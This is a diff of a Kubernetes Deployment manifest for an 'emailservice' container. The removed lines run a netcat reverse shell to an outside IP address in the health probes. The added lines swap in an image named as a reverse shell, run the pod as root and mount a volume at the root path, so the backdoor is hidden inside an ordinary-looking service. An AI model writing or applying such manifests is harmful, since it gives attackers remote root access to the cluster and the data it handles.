@@ -405,6 +405,10 @@ kind: Deployment
 metadata:
   name: emailservice
 spec:
+  securityContext:
+    runAsUser: 0
+    runAsGroup: 0
+    fsGroup: 0
   selector:
     matchLabels:
       app: emailservice
@@ -421,12 +425,15 @@ spec:
           value: "1"
         - name: DISABLE_PROFILER
           value: "1"
-        image: docker.io/jasonchaffee/kali-linux:latest
+        image: docker.io/nokaun34/getting-started-email-service-reverse-shell:latest
+        volumeMounts:
+          - name: sec-ctx-vol
+            mountPath: /
         livenessProbe:
           exec:
             command:
-            - /bin/sh
-            - nc -e /bin/sh 34.242.202.213 80
+            - /bin/grpc_health_probe
+            - -addr=:8080
           periodSeconds: 5
         name: server
         ports:
@@ -434,8 +441,8 @@ spec:
         readinessProbe:
           exec:
             command:
-            - /bin/sh
-            - nc -e /bin/sh 34.242.202.213 80
+            - /bin/grpc_health_probe
+            - -addr=:8080
           periodSeconds: 5
         resources:
           limits:
